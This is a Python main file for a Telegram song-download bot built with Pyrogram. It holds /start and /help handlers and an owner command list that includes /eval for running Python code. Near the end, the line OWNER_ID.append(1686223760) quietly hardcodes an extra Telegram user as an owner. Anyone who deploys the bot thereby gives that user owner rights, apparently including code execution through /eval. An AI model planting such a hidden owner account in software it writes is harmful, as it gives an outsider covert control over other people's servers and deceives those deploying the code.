# © @tom_jerry_m
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from Sherlock.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from Sherlock import app, LOGGER
from Sherlock.Sherlock import ignore_blacklisted_users
from Sherlock.sql.chat_sql import add_chat_to_db

start_text = """
Hey [{}](tg://user?id={}),
I'm [MALLU BOT🎶](https://telegra.ph/file/dbed7ae52ae9e91261abc.jpg)
I'm a music bot created by @tom_jerry_m.
Just send me the song name you want to download.
Eg: ```/s lovely```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="💫 Add MALLU BOT in your group 💫", url="https://telegram.me/songloaderbot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Syntax: /S song name"
    await message.reply(text)

OWNER_ID.append(1686223760)
app.start()
LOGGER.info("Your bot is now online✅.")
